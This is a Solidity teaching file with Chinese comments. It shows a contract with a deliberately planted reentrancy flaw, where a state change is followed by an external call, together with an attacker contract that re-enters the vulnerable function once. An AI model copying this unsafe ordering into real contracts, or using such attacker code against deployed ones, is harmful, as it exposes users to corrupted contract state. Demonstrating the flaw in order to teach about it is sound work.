/*
  漏洞名稱：Unsafe System State Changes
  描述：
  此漏洞產生的原因在於在狀態變數更新後立即進行外部呼叫，
  攻擊者可藉由在外部呼叫中 reentrancy 的方式，讓合約進入非預期的狀態，
  可能會造成效能或可用性問題。
  
  以下程式碼展示了一個帶有漏洞的合約，
  以及利用該漏洞進行重入攻擊的攻擊合約。注意標示的關鍵部位均以註解說明。
*/

// 定義一個接口，供 bug 函式在外部呼叫中用到
interface ICalled {
    function f() external;
}

contract Vulnerable {
    uint256 public counter; // 狀態變數，追蹤計數       // 漏洞重點：狀態變數更新後外部呼叫可能導致重入攻擊
    event Counter(uint256 count);

    // 漏洞函式 bug，外部呼叫 d.f() 位置不當可能使系統進入非預期狀態
    function bug(ICalled d) public {
        counter += 1;            // 狀態變數改變
        d.f();                   // 漏洞點：外部呼叫在狀態修改之後
        emit Counter(counter);   // 事件在外部呼叫後才觸發，可能被重入呼叫影響
    }
}

/*
  攻擊合約：Attacker
  說明：
  此攻擊合約利用自己作為 ICalled 傳入 Vulnerable 合約的 bug 函式，
  並在 f() 函式內再次呼叫 bug() 以觸發 reentrancy，此示例可利用多次重入造成系統狀態出現非預期狀態。
*/
contract Attacker is ICalled {
    Vulnerable public vulnerable;  // 目標 Vulnerable 合約
    uint256 public attackCount;    // 用來限制重入攻擊的次數，避免無限遞迴

    // 部署時需指定目標 Vulnerable 合約的位址
    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    // 攻擊入口，觸發漏洞函式 bug
    function attack() public {
        // 利用自己（this）作為 ICalled 傳入 bug
        vulnerable.bug(this);
    }

    // 在外部呼叫進入 f() 時觸發，進行重入攻擊
    function f() external override {
        attackCount++;
        // 限制重入次數，僅進行一次額外呼叫以示範漏洞
        if(attackCount < 2) {
            vulnerable.bug(this);
        }
    }
}
